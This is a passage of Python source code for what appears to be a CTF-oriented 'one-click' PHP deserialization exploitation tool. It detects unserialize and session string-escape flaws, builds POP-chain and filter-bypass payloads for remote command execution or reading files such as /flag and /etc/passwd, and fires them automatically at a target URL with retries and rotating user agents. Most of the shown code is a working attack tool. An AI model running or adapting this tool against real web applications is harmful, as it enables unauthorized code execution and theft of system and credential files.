    def _get_danger_type(self, func: str) -> str:
        dangerous = {
            'rce': ['system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open', 'pcntl_exec', 'eval', 'assert'],
            'file_read': ['file_get_contents', 'file', 'fopen', 'readfile', 'show_source', 'highlight_file', 'include', 'include_once', 'require', 'require_once'],
            'file_write': ['file_put_contents', 'fwrite'],
            'code_exec': ['call_user_func', 'call_user_func_array']
        }
        for dtype, funcs in dangerous.items():
            if func in funcs:
                return dtype
        return 'unknown'
    
    def _parse_default(self, value: str):
        if not value:
            return ""
        value = value.strip()
        if value.startswith('"') or value.startswith("'"):
            return value[1:-1] if len(value) > 1 else ""
        if value.lower() == 'true':
            return True
        if value.lower() == 'false':
            return False
        if value.lower() == 'null':
            return None
        try:
            return int(value)
        except ValueError:
            try:
                return float(value)
            except ValueError:
                return value
        return value
    
    def _deduplicate_payloads(self, payloads: List[dict]) -> List[dict]:
        seen = set()
        result = []
        for p in payloads:
            key = p['payload'][:50]
            if key not in seen:
                seen.add(key)
                result.append(p)
        return result


class PayloadEncoder:
    @staticmethod
    def url_encode(payload: str) -> str:
        return urllib.parse.quote(payload, safe='')

    @staticmethod
    def base64_encode(payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def raw_url_encode(payload: str) -> str:
        result = ""
        for char in payload:
            if char == '\x00':
                result += '%00'
            else:
                result += urllib.parse.quote(char, safe='')
        return result


class LogLevel(Enum):
    DEBUG = 0
    INFO = 1
    WARN = 2
    ERROR = 3


class Logger:
    def __init__(self, log_file: str = 'exploit_log.txt'):
        self.log_file = log_file
        self.level = LogLevel.INFO
        self.records = []

    def set_level(self, level: LogLevel):
        self.level = level

    def _format_time(self):
        from datetime import datetime
        return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    def _write(self, level: LogLevel, msg: str):
        if level.value < self.level.value:
            return
        timestamp = self._format_time()
        level_str = level.name.ljust(5)
        formatted = f"[{timestamp}] {level_str} {msg}"
        self.records.append(formatted)
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(formatted + '\n')

    def debug(self, msg: str):
        self._write(LogLevel.DEBUG, msg)

    def info(self, msg: str):
        self._write(LogLevel.INFO, msg)

    def warn(self, msg: str):
        self._write(LogLevel.WARN, msg)

    def error(self, msg: str):
        self._write(LogLevel.ERROR, msg)

    def section(self, title: str):
        sep = "=" * 70
        line = f"\n{sep}\n  {title}\n{sep}\n"
        self.records.append(line)
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(line + '\n')


class SessionStringEscapeDetector:
    """
    Session反序列化字符串逃逸检测器
    基于filter()函数将关键字替换为空导致的长度减少进行字符串逃逸
    """

    def __init__(self, code: str):
        self.code = code
        self.filters = []
        self.session_vars = []
        self.extract_post = False
        self.serialize_session = False
        self.filter_replace = False

    def analyze(self) -> dict:
        result = {
            'has_vulnerability': False,
            'filters': [],
            'session_vars': [],
            'exploitable': False,
            'escape_method': None,
            'payloads': []
        }

        self._find_filter_function()
        self._find_session_handling()
        self._find_extract_post()

        result['filters'] = self.filters
        result['session_vars'] = self.session_vars
        result['extract_post'] = self.extract_post
        result['has_vulnerability'] = self._check_vulnerability()
        result['serialize_session'] = self.serialize_session
        result['filter_replace'] = self.filter_replace

        if result['has_vulnerability']:
            result['exploitable'] = True
            result['escape_method'] = 'filter_length_reduction'
            result['payloads'] = self._generate_escape_payloads()

        return result

    def _find_filter_function(self):
        filter_arr_pattern = r'\$filter_arr\s*=\s*array\s*\(([^)]+)\)'
        for match in re.finditer(filter_arr_pattern, self.code):
            filter_content = match.group(1)
            keywords = re.findall(r"'([^']+)'", filter_content)
            self.filters.extend(keywords)

        if "preg_replace($filter,'',$img)" in self.code or \
           "preg_replace($filter, \"\" ,$img)" in self.code or \
           "preg_replace($filter,'', $img)" in self.code:
            self.filter_replace = True

    def _find_session_handling(self):
        if re.search(r'\$_SESSION\s*\[', self.code):
            session_assign_pattern = r'\$_SESSION\s*\[\s*["\']?(\w+)["\']?\s*\]\s*=\s*([^;]+);'
            for match in re.finditer(session_assign_pattern, self.code):
                var_name = match.group(1)
                value = match.group(2).strip()
                self.session_vars.append({'name': var_name, 'value': value})

        if 'serialize($_SESSION)' in self.code or 'serialize($_SESSION' in self.code:
            self.serialize_session = True

        if re.search(r'unserialize\s*\(\s*[^)]*\$serialize', self.code):
            pass

    def _find_extract_post(self):
        if 'extract($_POST)' in self.code or 'extract($_GET)' in self.code:
            self.extract_post = True

    def _check_vulnerability(self) -> bool:
        if not self.filters:
            return False
        if not self.session_vars:
            return False
        if not self.extract_post:
            return False
        if not self.serialize_session:
            return False
        if not self.filter_replace:
            return False
        return True

    def _generate_escape_payloads(self) -> List[dict]:
        payloads = []

        filter_keywords = [k.lower() for k in self.filters]

        if 'php' in filter_keywords and 'flag' in filter_keywords:
            evil_user = 'flag' * 5 + 'php'
            padding_len = len(evil_user) - len(evil_user.replace('flag', '').replace('php', ''))

            normal_serial = 'a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:18:"Z3Vlc3RfaW1nLnBuZw==";}'

            for func_val in ['show_image', 'highlight_file', 'phpinfo', 'fl3g', 'fl4g']:
                for img_path in ['/flag', 'flag.php', 'fllllllag.php', '/d0g3_fllllllag']:
                    encoded_img = base64.b64encode(img_path.encode()).decode()
                    escaped_value = f'";s:3:"img";s:{len(encoded_img)}:"{encoded_img}";s:1:"1";s:1:"2";}}'

                    payload_data = {
                        'POST': {
                            '_SESSION[user]': evil_user,
                            '_SESSION[function]': escaped_value
                        },
                        'GET': {
                            'f': 'show_image'
                        },
                        'method': 'session_string_escape',
                        'target_file': img_path,
                        'base64_img': encoded_img,
                        'description': f'字符串逃逸读取{img_path}'
                    }
                    payloads.append(payload_data)

        common_bypass = {}
        for kw in ['php', 'flag', 'fl1g', 'php5', 'php4']:
            if kw in filter_keywords:
                if kw == 'php':
                    common_bypass[kw] = 'pphphp'
                elif kw == 'flag':
                    common_bypass[kw] = 'fl3g'
                elif kw == 'fl1g':
                    common_bypass[kw] = 'fl3g'
                elif kw == 'php5':
                    common_bypass[kw] = 'pphphp5'
                elif kw == 'php4':
                    common_bypass[kw] = 'pphphp4'

        for kw, bypass in common_bypass.items():
            for func_val in ['show_image', 'highlight_file', 'phpinfo']:
                payload_data = {
                    'POST': {
                        '_SESSION[user]': 'guest',
                        '_SESSION[function]': func_val
                    },
                    'GET': {
                        'f': 'show_image'
                    },
                    'filter_bypass': {kw: bypass},
                    'method': 'filter_bypass',
                    'description': f'{kw}->{bypass}绕过'
                }
                payloads.append(payload_data)

        return payloads

    def generate_two_stage_payloads(self) -> List[dict]:
        payloads = []

        filter_keywords = [k.lower() for k in self.filters]
        if 'php' not in filter_keywords or 'flag' not in filter_keywords:
            return payloads

        first_stage_file = 'd0g3_f1ag.php'
        encoded_first = base64.b64encode(first_stage_file.encode()).decode()

        second_stage_files = ['/d0g3_fllllllag', '/flag', 'flag.php']

        evil_user = 'flag' * 5 + 'php'

        for img_path in second_stage_files:
            encoded_second = base64.b64encode(img_path.encode()).decode()

            stage1_escaped = '";s:3:"img";s:' + str(len(encoded_first)) + ':"' + encoded_first + '";s:1:"1";s:1:"2";}'
            stage2_escaped = '";s:3:"img";s:' + str(len(encoded_second)) + ':"' + encoded_second + '";s:1:"1";s:1:"2";}'

            payload = {
                'stage1': {
                    'GET': {'f': 'show_image'},
                    'POST': {
                        '_SESSION[user]': evil_user,
                        '_SESSION[function]': stage1_escaped
                    },
                    'description': f'第一阶段:读取{first_stage_file}'
                },
                'stage2': {
                    'GET': {'f': 'show_image'},
                    'POST': {
                        '_SESSION[user]': evil_user,
                        '_SESSION[function]': stage2_escaped
                    },
                    'description': f'第二阶段:读取{img_path}'
                }
            }
            payloads.append(payload)

        return payloads


class ResponseAnalyzer:
    FAKE_SUCCESS_PATTERNS = [
        r'Welcome to',
        r'<br>',
        r'hacker',
        r'illegal',
        r'forbidden',
        r'index\.php',
        r'<script>',
        r'Not Found',
        r'404',
        r'500',
        r'Internal Server Error',
        r'Access Denied',
        r'Unauthorized',
    ]

    FLAG_PATTERNS = [
        r'NSSCTF\{[^}]+\}',
        r'flag\{[^}]+\}',
        r'ctf\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'\{[A-Za-z0-9_]{20,}\}',
        r'[A-Za-z0-9]{30,}==',
    ]

    HINT_PATTERNS = [
        r'flag\s+in\s+["\']([^"\']+)["\']',
        r'flag.*?=\s*["\']([^"\']+)["\']',
        r'CTF\s*\{[^}]+\}',
        r'the flag is ([^\s<]+)',
        r'find the flag at ([^\s<]+)',
    ]

    QUALITY_INDICATORS = [
        'flag', 'ctf', 'root:', 'uid=', 'gid=', 'bin/', 'etc/',
        'password', 'shadow', '/home', '/var', '/tmp', 'drwx',
        '-rw-r--', 'total ', '/sbin', '/bin', 'success', 'NSSCTF'
    ]

    def __init__(self):
        self.false_positive_patterns = [re.compile(p, re.IGNORECASE) for p in self.FAKE_SUCCESS_PATTERNS]
        self.flag_patterns = [re.compile(p, re.IGNORECASE) for p in self.FLAG_PATTERNS]
        self.quality_indicators = [i.lower() for i in self.QUALITY_INDICATORS]

    def is_fake_success(self, response: str) -> bool:
        response_lower = response.lower()
        for pattern in self.false_positive_patterns:
            if pattern.search(response):
                return True
        if response_lower.count('welcome') > 0 and 'index.php' in response_lower:
            return True
        if 'hacker' in response_lower and len(response) < 200:
            return True
        return False

    def find_flag(self, response: str) -> tuple:
        for pattern in self.flag_patterns:
            match = pattern.search(response)
            if match:
                return True, match.group()
        import base64
        try:
            decoded = base64.b64decode(response.strip()).decode('utf-8', errors='ignore')
            for pattern in self.flag_patterns:
                match = pattern.search(decoded)
                if match:
                    return True, match.group()
        except Exception:
            pass
        return False, None

    def calculate_quality_score(self, response: str) -> float:
        if not response or len(response.strip()) == 0:
            return 0.0

        score = 0.0
        response_lower = response.lower()

        content_length = len(response.strip())
        if content_length > 100:
            score += 0.1
        if content_length > 500:
            score += 0.1
        if content_length > 1000:
            score += 0.1

        for indicator in self.quality_indicators:
            if indicator in response_lower:
                score += 0.15

        html_tags = re.findall(r'<[^>]+>', response)
        if len(html_tags) > 0:
            score -= len(html_tags) * 0.02

        clean_response = re.sub(r'<[^>]+>', ' ', response)
        clean_response = re.sub(r'&[a-zA-Z]+;', ' ', clean_response)
        clean_response = re.sub(r'&#\d+;', ' ', clean_response)
        clean_words = [w for w in clean_response.split() if len(w) > 2]

        if len(clean_words) > 5:
            score += 0.1

        if 'password' in response_lower or 'shadow' in response_lower:
            score += 0.3
        if '/etc/passwd' in response_lower:
            score += 0.2
        if 'root:' in response_lower:
            score += 0.25

        return min(score, 1.0)

    def analyze_response(self, response: str) -> dict:
        has_flag, flag_value = self.find_flag(response)
        is_fake = self.is_fake_success(response)
        quality_score = self.calculate_quality_score(response)
        has_hint, hint_value = self.find_hint(response)

        clean_response = re.sub(r'<[^>]+>', '', response)
        clean_response = re.sub(r'//.*', '', clean_response)
        clean_response = re.sub(r'/\*.*?\*/', '', clean_response, flags=re.DOTALL)

        return {
            'has_flag': has_flag,
            'flag_value': flag_value,
            'is_fake_success': is_fake,
            'quality_score': quality_score,
            'clean_response': clean_response.strip()[:500],
            'has_hint': has_hint,
            'hint_value': hint_value
        }

    def find_hint(self, response: str) -> tuple:
        for pattern in self.HINT_PATTERNS:
            match = re.search(pattern, response, re.IGNORECASE)
            if match:
                return True, match.group(1) if match.groups() else match.group()
        return False, None


class PHPUnserializeTool:
    def __init__(self):
        self.parser = None
        self.classes = []
        self.chain_builder = None
        self.payload_generator = None
        self.session_escape_detector = None
        self.raw_code = None

    def load_php_code(self, code: str):
        self.raw_code = code
        self.parser = PHPClassParser(code)
        self.classes = self.parser.parse()
        self.chain_builder = SmartPOPChainBuilder(self.classes)
        self.payload_generator = SmartPayloadGenerator(self.classes, [])
        self.session_escape_detector = SessionStringEscapeDetector(code)
        return self.classes
    
    def load_php_file(self, filepath: str):
        with open(filepath, 'r', encoding='utf-8') as f:
            return self.load_php_code(f.read())
    
    def load_php_url(self, url: str):
        import urllib.request
        import urllib.error
        
        try:
            req = urllib.request.Request(url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            with urllib.request.urlopen(req, timeout=10) as response:
                return self.load_php_code(response.read().decode('utf-8'))
        except Exception as e:
            print(f"[-] 加载URL失败: {e}")
            return []
    
    def is_url(self, path: str) -> bool:
        return path.startswith('http://') or path.startswith('https://')
    
    def load_php_source(self, source: str):
        if self.is_url(source):
            return self.load_php_url(source)
        else:
            return self.load_php_file(source)
    
    def auto_exploit(self, target_url: str, payloads: List[dict],
                     param_name: str = 'ser', method: str = 'GET',
                     timeout: int = 10, retry_count: int = 3,
                     retry_interval: int = 2) -> List[dict]:
        import urllib.request
        import urllib.parse
        import urllib.error
        import time

        logger = Logger('exploit_log.txt')
        logger.section('Exploitation Started')
        logger.info(f"Target: {target_url}")
        logger.info(f"Param: {param_name}, Method: {method}")
        logger.info(f"Payloads count: {len(payloads)}")

        response_analyzer = ResponseAnalyzer()
        results = []

        methods_to_try = ['GET', 'POST'] if method.upper() == 'REQUEST' else [method.upper()]

        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        ]

        for i, payload_info in enumerate(payloads, 1):
            payload = payload_info['payload']
            encoded_payload = urllib.parse.quote(payload)

            logger.debug(f"Payload {i}: {payload[:80]}...")
            print(f"\n[*] 发送 Payload {i}...")
            print(f"    Payload: {payload}")
            print(f"    长度: {len(payload)} 字节")

            for current_method in methods_to_try:
                print(f"    方法: {current_method}")
                logger.info(f"Trying payload {i} with method {current_method}")

                success = False
                result = None
                last_error = None

                for attempt in range(retry_count):
                    try:
                        headers = {
                            'User-Agent': user_agents[attempt % len(user_agents)]
                        }

                        if current_method == 'GET':
                            url = f"{target_url}?{param_name}={encoded_payload}"
                            req = urllib.request.Request(url, headers=headers)
                            with urllib.request.urlopen(req, timeout=timeout) as response:
                                result = response.read().decode('utf-8', errors='ignore')
                        else:
                            data = urllib.parse.urlencode({param_name: payload}).encode()
                            req = urllib.request.Request(target_url, data=data, headers={
                                **headers,
                                'Content-Type': 'application/x-www-form-urlencoded'
                            })
                            with urllib.request.urlopen(req, timeout=timeout) as response:
                                result = response.read().decode('utf-8', errors='ignore')

                        success = True
                        break

                    except urllib.error.HTTPError as e:
                        last_error = f"HTTP {e.code}"
                        logger.warn(f"HTTP Error {e.code} on attempt {attempt + 1}")
                        if e.code in [500, 502, 503, 504]:
                            time.sleep(retry_interval * (attempt + 1))
                            continue
                        break

                    except urllib.error.URLError as e:
                        last_error = f"URL Error: {e.reason}"
                        logger.warn(f"URL Error: {e.reason} on attempt {attempt + 1}")

                    except TimeoutError:
                        last_error = "Timeout"
                        logger.warn(f"Timeout on attempt {attempt + 1}")

                    except Exception as e:
                        last_error = str(e)
                        logger.error(f"Unexpected error: {e}")

                    if attempt < retry_count - 1:
                        time.sleep(retry_interval * (attempt + 1))

                if not success:
                    res_dict = {
                        'payload_index': i,
                        'payload': payload,
                        'method': current_method,
                        'error': last_error,
                        'success': False,
                        'has_flag': False,
                        'response': ''
                    }
                    results.append(res_dict)
                    continue

                analysis = response_analyzer.analyze_response(result)

                res_dict = {
                    'payload_index': i,
                    'payload': payload,
                    'method': current_method,
                    'response': result,
                    'success': analysis['has_flag'] or (analysis['quality_score'] > 0.5 and not analysis['is_fake_success']),
                    'has_flag': analysis['has_flag'],
                    'flag_value': analysis['flag_value'],
                    'quality_score': analysis['quality_score'],
                    'is_fake_success': analysis['is_fake_success'],
                    'clean_response': analysis['clean_response']
                }
                logger.info(f"Result: has_flag={analysis['has_flag']}, quality={analysis['quality_score']:.2f}, fake={analysis['is_fake_success']}")
                logger.debug(f"Response preview: {analysis['clean_response'][:100]}...")

                results.append(res_dict)

                if analysis['has_flag']:
                    logger.info(f"*** FLAG FOUND: {analysis['flag_value']} ***")
                    break

                if res_dict['success']:
                    break

            if res_dict.get('has_flag'):
                break

        logger.section('Exploitation Finished')
        success_count = sum(1 for r in results if r.get('success'))
        flag_count = sum(1 for r in results if r.get('has_flag'))
        logger.info(f"Total: {len(results)} attempts, {success_count} success, {flag_count} flags found")

        return results
    
    def analyze(self) -> dict:
        chains = self.chain_builder.build_all_chains() if self.chain_builder else []
        self.payload_generator = SmartPayloadGenerator(self.classes, chains)

        session_escape_result = {}
        if self.session_escape_detector:
            session_escape_result = self.session_escape_detector.analyze()

        return {
            'classes': self.classes,
            'chains': chains,
            'session_escape': session_escape_result
        }

    def exploit_session_escape(self, target_url: str, payloads: List[dict],
                                timeout: int = 10, retry_count: int = 3) -> dict:
        import urllib.request
        import urllib.parse
        import urllib.error
        import time

        logger = Logger('exploit_log.txt')
        logger.section('Session字符串逃逸利用')

        response_analyzer = ResponseAnalyzer()
        results = []

        for i, payload_info in enumerate(payloads, 1):
            method = payload_info.get('method', 'unknown')

            if method == 'session_string_escape':
                post_data = payload_info.get('POST', {})
                get_params = payload_info.get('GET', {})
                target_file = payload_info.get('target_file', 'unknown')
                description = payload_info.get('description', '')

                logger.info(f"Payload {i}: {description}")

                get_url = target_url
                if get_params:
                    get_query = urllib.parse.urlencode(get_params)
                    get_url = f"{target_url}?{get_query}" if '?' not in target_url else f"{target_url}&{get_query}"

                post_data_encoded = urllib.parse.urlencode(post_data).encode()

                for attempt in range(retry_count):
                    try:
                        req = urllib.request.Request(
                            get_url,
                            data=post_data_encoded,
                            headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                                'Content-Type': 'application/x-www-form-urlencoded'
                            }
                        )

                        with urllib.request.urlopen(req, timeout=timeout) as response:
                            result = response.read().decode('utf-8', errors='ignore')

                        analysis = response_analyzer.analyze_response(result)

                        res_dict = {
                            'payload_index': i,
                            'payload': payload_info,
                            'response': result,
                            'has_flag': analysis['has_flag'],
                            'flag_value': analysis['flag_value'],
                            'has_hint': analysis['has_hint'],
                            'hint_value': analysis['hint_value'],
                            'quality_score': analysis['quality_score'],
                            'description': description,
                            'method': method
                        }

                        results.append(res_dict)

                        if analysis['has_flag']:
                            logger.info(f"*** FLAG FOUND: {analysis['flag_value']} ***")
                            return res_dict

                        if analysis['has_hint']:
                            logger.info(f"[!] 发现提示: {analysis['hint_value']}")

                        break

                    except urllib.error.HTTPError as e:
                        logger.warn(f"HTTP Error {e.code} on attempt {attempt + 1}")
                        if attempt < retry_count - 1:
                            time.sleep(1 * (attempt + 1))

                    except Exception as e:
                        logger.error(f"Error: {e}")
                        break

        logger.section('利用完成')
        return results[-1] if results else {'success': False}

    def auto_generate_payloads(self, cmd: str = "id", file: str = "/flag") -> List[dict]:
        if not self.payload_generator:
            return []
        return self.payload_generator.generate_all_payloads(cmd, file)
    
    def _inject_custom_code(self, payload: str, code: str) -> str:
        import re
        
        def replace_string_value(match):
            length = len(code)
            return f's:{length}:"{code}";'
        
        pattern = r's:\d+:"[^"]*(?:system|eval|exec|shell_exec|passthru|file_get_contents|file|highlight_file|show_source|include|require)[^"]*";'
        
        if re.search(pattern, payload):
            new_payload = re.sub(pattern, replace_string_value, payload, count=1)
            return new_payload
        
        string_pattern = r's:\d+:"([^"]+)";'
        matches = list(re.finditer(string_pattern, payload))
        
        for match in reversed(matches):
            old_str = match.group(1)
            if len(old_str) > 3 and not old_str.startswith(('O:', 'a:', 'i:', 'b:', 'N;')):
                new_str = f's:{len(code)}:"{code}";'
                new_payload = payload[:match.start()] + new_str + payload[match.end():]
                return new_payload
        
        return payload
    
    def print_analysis(self, raw_code: str = None):
        result = self.analyze()

        print("\n" + "="*70)
        print("  PHP反序列化漏洞智能分析报告")
        print("="*70)

        print(f"\n[*] 发现 {len(result['classes'])} 个类:")
        for php_class in result['classes']:
            print(f"\n  ┌─ 类: {php_class.name}")
            if php_class.properties:
                print(f"  │  属性:")
                for prop in php_class.properties:
                    default = f" = {prop.default_value}" if prop.default_value else ""
                    print(f"  │    {prop.visibility.value} ${prop.name}{default}")
            if php_class.methods:
                print(f"  │  方法:")
                for method in php_class.methods:
                    magic_tag = " [魔术方法]" if method.is_magic else ""
                    print(f"  │    {method.visibility.value} {method.name}(){magic_tag}")
            print(f"  └─")

        chains = result['chains']

        if 'session_escape' in result and result['session_escape']:
            session_escape = result['session_escape']
            if session_escape.get('has_vulnerability'):
                print("\n" + "="*70)
                print("  [!] 检测到Session字符串逃逸漏洞")
                print("="*70)
                print(f"\n  [+] 漏洞类型: Session反序列化字符串逃逸")
                print(f"  [+] 过滤关键词: {', '.join(session_escape.get('filters', []))}")
                print(f"  [+] 利用方法: filter长度减少导致字符串逃逸")
                print(f"  [+] extract()变量覆盖: {'是' if session_escape.get('extract_post') else '否'}")
                print(f"  [+] Session序列化: {'是' if session_escape.get('serialize_session') else '否'}")

                payloads = session_escape.get('payloads', [])
                if payloads:
                    print(f"\n  [+] 可用Payload数量: {len(payloads)}")
                    print("\n  推荐Payload示例:")
                    for p in payloads[:5]:
                        if isinstance(p, dict) and 'description' in p:
                            print(f"    - {p['description']}")

        if chains:
            print("\n" + "="*70)
            print("  [!] 发现可利用的POP链")
            print("="*70)
            for i, chain in enumerate(chains, 1):
                sink = chain['sink']
                entry = chain['entry']
                entry_class = entry['class'].name if hasattr(entry['class'], 'name') else entry['class']
                entry_method = entry['method'].name if hasattr(entry['method'], 'name') else entry['method']

                print(f"\n  链 {i}: [{chain['type'].upper()}]")
                print(f"    入口: {entry_class}::{entry_method}")
                print(f"    危险函数: {sink['function']}()")
                print(f"    利用类型: {chain['type']}")

                prop_chain = chain.get('prop_chain', [])
                if prop_chain:
                    chain_str = ' -> '.join([link['to_class'] for link in prop_chain])
                    print(f"    调用链: {entry_class} -> {chain_str}")
        else:
            print("\n[!] 未发现明显的POP链")

        if HAS_PATTERN_DETECTOR and raw_code:
            print("\n" + "="*70)
            print("  无类漏洞模式检测")
            print("="*70)

            detector = PatternDetector(raw_code)
            patterns = detector.detect_all()

            if patterns:
                for pattern in patterns:
                    print(f"\n  [VULN] {pattern.vuln_type.value.upper()}")
                    print(f"        置信度: {pattern.confidence:.0%}")
                    print(f"        {pattern.description}")
                    print(f"        位置: {pattern.location}")

                    if hasattr(pattern, 'payloads') and pattern.payloads:
                        print(f"        推荐Payload:")
                        for payload in pattern.payloads[:3]:
                            if len(payload) > 60:
                                print(f"          {payload[:60]}...")
                            else:
                                print(f"          {payload}")
            else:
                print("\n  [-] 未检测到无类漏洞模式")
    
    def print_auto_payloads(self, cmd: str = "id", file: str = "/flag"):
        payloads = self.auto_generate_payloads(cmd, file)
        
        if not payloads:
            print("\n[!] 无法自动生成payload，请手动构造")
            return
        
        print("\n" + "="*70)
        print("  [+] 自动生成的Payload")
        print("="*70)
        
        for i, p in enumerate(payloads, 1):
            print(f"\n  Payload {i} [{p['type'].upper()}] - 类: {p['class']}")
            print(f"  ┌{'─'*66}┐")
            
            payload = p['payload']
            if len(payload) > 60:
                print(f"  │ {payload[:60]}")
                for j in range(60, len(payload), 64):
                    print(f"  │ {payload[j:j+64]}")
            else:
                print(f"  │ {payload}")
            print(f"  └{'─'*66}┘")
            
            print(f"\n  编码选项:")
            print(f"    URL编码: {PayloadEncoder.url_encode(payload)}")
            print(f"    Base64:  {PayloadEncoder.base64_encode(payload)}")
    
    def generate_custom_payload(self, class_name: str, properties: dict, 
                                encoder: str = None) -> str:
        obj = PHPObject(class_name)
        for name, config in properties.items():
            if isinstance(config, dict):
                value = config.get('value')
                visibility = config.get('visibility', Visibility.PUBLIC)
            else:
                value = config
                visibility = Visibility.PUBLIC
            obj.add_property(name, value, visibility)
        
        payload = obj.serialize()
        
        if encoder == 'url':
            payload = PayloadEncoder.url_encode(payload)
        elif encoder == 'base64':
            payload = PayloadEncoder.base64_encode(payload)
        elif encoder == 'raw_url':
            payload = PayloadEncoder.raw_url_encode(payload)
        
        return payload
    
    def print_full_report(self, cmd: str = "id", file: str = "/flag"):
        self.print_analysis()
        self.print_auto_payloads(cmd, file)
        
        print("\n" + "="*70)
        print("  传输方式提示")
        print("="*70)
        print("""
  GET请求:    ?payload=YOUR_PAYLOAD
  POST请求:   payload=YOUR_PAYLOAD
  Cookie:     token=YOUR_PAYLOAD
  Header:     X-Token: YOUR_PAYLOAD
        """)


def main():
    parser = argparse.ArgumentParser(
        description='PHP反序列化自动工具 - 一键利用版',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
简单用法:
  %(prog)s http://target.com/              # 一键自动利用
  %(prog)s -f vuln.php http://target.com/  # 本地源码+远程利用
  %(prog)s http://target.com/ --cmd "id"   # 指定RCE命令
  %(prog)s http://target.com/ --read /etc/passwd  # 指定读取文件

高级用法:
  %(prog)s -c "User" -p "name:admin"       # 手动生成payload
        """
    )
    
    parser.add_argument('target', nargs='?', help='目标URL (必填，用于自动利用)')
    parser.add_argument('-f', '--file', help='本地PHP源码文件 (可选，不指定则从URL获取)')
    parser.add_argument('-c', '--class', dest='class_name', help='目标类名(手动模式)')
    parser.add_argument('-p', '--properties', help='属性值，格式: name:value,name2:value2')
    parser.add_argument('-v', '--visibility', help='属性可见性，格式: name:private')
    parser.add_argument('-e', '--encode', choices=['url', 'base64', 'raw_url'], help='编码方式')
    parser.add_argument('--cmd', help='RCE命令')
    parser.add_argument('--read', dest='file_read', help='要读取的文件路径')
    parser.add_argument('--code', help='自定义PHP代码')
    parser.add_argument('--param', help='参数名 (自动检测常见参数)')
    parser.add_argument('--method', choices=['GET', 'POST', 'REQUEST'], default='REQUEST', help='请求方法 (默认: REQUEST)')
    
    args = parser.parse_args()
    
    tool = PHPUnserializeTool()
    
    if args.class_name and args.properties:
        vis_map = {}
        if args.visibility:
            for item in args.visibility.split(','):
                if ':' in item:
                    name, vis = item.split(':', 1)
                    vis_map[name.strip()] = Visibility(vis.strip().lower())
        
        props = {}
        for item in args.properties.split(','):
            if ':' in item:
                name, value = item.split(':', 1)
                name = name.strip()
                value = value.strip()
                
                if value.lower() == 'true':
                    value = True
                elif value.lower() == 'false':
                    value = False
                elif value.isdigit():
                    value = int(value)
                
                if name in vis_map:
                    props[name] = {'value': value, 'visibility': vis_map[name]}
                else:
                    props[name] = value
        
        payload = tool.generate_custom_payload(args.class_name, props, args.encode)
        print(f"\n生成的Payload:\n{payload}")
        return
    
    if not args.target:
        parser.print_help()
        return
    
    print("="*70)
    print("  PHP反序列化一键利用工具")
    print("="*70)

    source = args.file if args.file else args.target
    print(f"\n[*] 加载PHP源码: {source}")

    raw_code = None
    if tool.is_url(source):
        tool.load_php_url(source)
        if args.file:
            with open(args.file, 'r', encoding='utf-8') as f:
                raw_code = f.read()
    else:
        tool.load_php_file(source)
        with open(source, 'r', encoding='utf-8') as f:
            raw_code = f.read()

    tool.print_analysis(raw_code)

    result = tool.analyze()

    has_filter_bypass = False
    bypass_payloads = []
    if HAS_PATTERN_DETECTOR and raw_code:
        detector = PatternDetector(raw_code)
        patterns = detector.detect_all()
        for pattern in patterns:
            if pattern.vuln_type.value == 'filter_bypass':
                has_filter_bypass = True
                bypass_payloads = pattern.payloads
                break

    if not result['chains'] and not has_filter_bypass:
        print("\n[-] 未发现可利用的POP链，也未检测到无类漏洞模式")
        return

    if not result['chains'] and has_filter_bypass:
        print("\n[!] 未发现POP链，但检测到Filter Bypass漏洞模式")
        print("\n" + "="*70)
        print("  Filter Bypass Payload 生成")
        print("="*70)

        filters = []
        if HAS_PATTERN_DETECTOR and raw_code:
            detector = PatternDetector(raw_code)
            patterns = detector.detect_all()
            for pattern in patterns:
                if hasattr(pattern, 'details') and 'filters' in pattern.details:
                    filters = pattern.details['filters']
                    break

        if filters:
            from filter_bypass import FilterBypassPayloadGenerator
            gen = FilterBypassPayloadGenerator(filters)
            all_payloads = gen.generate_all_payloads()

            print(f"\n[*] 过滤关键词: {', '.join(filters)}")
            print(f"[*] 生成绕过Payload数量: {len(all_payloads)}")

            if all_payloads:
                print("\n[*] 绕过Payload示例:")
                for p in all_payloads[:10]:
                    print(f"    {p.get('method', 'unknown')}: {p['payload'][:60]}...")
        else:
            print("\n[*] 使用检测到的Payload:")
            for i, payload in enumerate(bypass_payloads[:10], 1):
                print(f"    [{i}] {payload}")

        user_continue = input("\n[?] 是否尝试利用这些Payload? (y/n): ").strip().lower()
        if user_continue != 'y':
            return

    has_rce = any(c['type'] == 'rce' for c in result['chains'])
    has_file_read = any(c['type'] == 'file_read' for c in result['chains'])
    has_wakeup_entry = any(
        c.get('entry', {}).get('method', '') == '__wakeup' or
        (hasattr(c.get('entry', {}).get('method', ''), 'name') and c['entry']['method'].name == '__wakeup')
        for c in result['chains']
    )

    has_session_escape = (
        'session_escape' in result and
        result['session_escape'] and
        result['session_escape'].get('has_vulnerability', False)
    )

    print("\n" + "="*70)
    print("  自动利用")
    print("="*70)

    common_params = ['ser', 'data', 'payload', 'x', 'str', 'input', 'var', 'p', 'f']
    common_files = ['/flag', '/flag.txt', 'flag.php', 'fllllllag.php', '/etc/passwd', 'flag', 'show_image']
    common_cmds = ['id', 'ls', 'cat /flag', 'ls /']

    bypass_mode = has_filter_bypass and not result['chains'] and not has_session_escape
    filter_bypass_gen = None
    params_to_try = common_params

    found_flag = False

    if has_session_escape:
        print(f"\n[!] 漏洞类型: SESSION_STRING_ESCAPE (Session字符串逃逸)")
        session_escape = result['session_escape']
        print(f"[*] 检测到Session字符串逃逸漏洞")
        print(f"[*] 过滤关键词: {', '.join(session_escape.get('filters', []))}")

